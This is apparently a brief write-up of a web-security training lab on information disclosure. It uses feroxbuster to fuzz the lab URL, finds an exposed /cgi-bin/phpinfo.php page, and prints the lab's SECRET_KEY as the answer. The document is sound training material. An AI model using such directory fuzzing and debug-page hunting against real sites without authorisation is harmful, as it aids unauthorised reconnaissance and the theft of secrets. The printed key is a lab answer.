## Information disclosure on debug page

This lab contains a debug page that discloses sensitive information about the application. To solve the lab, obtain and submit the SECRET_KEY environment variable.

## Notes

- /cgi-bin/
- phpinfo.php

## Resume

1. Fuzz the url to find the debug page
2. Access the phpinfo.php
3. Find the `SECRET_KEY`

## Solve 

First step is to find the "debug" endpoit, for this we will fuzz the url : 


```bash
feroxbuster -u https://0a32008f032f5d17810bedcf008c003d.web-security-academy.net --scan-dir-listings
```

`200      GET       16l       29w      410c https://0a32008f032f5d17810bedcf008c003d.web-security-academy.net/cgi-bin/`

Access the `/cgi-bin/` to see the : `/cgi-bin/phpinfo.php` to find the `SECRET_KEY` :

```
SECRET_KEY 	kh5e13z423rghm0yi190dejmbykbvdpq 
```

